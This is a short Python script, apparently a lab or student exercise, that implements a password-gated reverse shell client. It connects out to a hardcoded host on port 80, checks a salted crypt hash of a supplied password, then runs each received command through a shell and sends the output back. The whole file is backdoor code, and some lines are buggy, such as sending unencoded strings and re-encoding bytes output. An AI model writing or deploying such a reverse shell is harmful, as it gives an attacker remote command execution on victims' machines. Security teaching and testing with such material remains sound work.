import socket
import subprocess
import crypt

HOST = "10.0.2.4"
PORT = 80
BUFFER = 1024
CORRECT_PASS = "secGBN1BHq1FA"
SALT = "secure_hintz"
# client
def main():
    print("running client side with: " + HOST + " and " + str(PORT))

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    print("attempting to connect")
    client.connect((HOST, PORT))

    # password
    client.send("Input your password: ".encode())
    password = client.recv(BUFFER).decode("UTF-8")

    password = crypt.crypt(password, SALT)

    if password != CORRECT_PASS:
        client.send("Incorrect password. Closing connection")
        client.close()
    else: 

        # send something
        while True: 
            
            command = client.recv(BUFFER).decode("UTF-8")
            # EXECUTING COMMAND
            # getoutput returns output stdout and stderr of executing cmd in a shell
            print(command)
            if command == "":
                print("command is empty. Closing connection")
                break
            try: 
                output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                client.send(output.encode())
            except:
                print("uh oh spaghetti o you have an error with your input :c")
                client.close()
            
        client.close()

if __name__ == "__main__":
    main()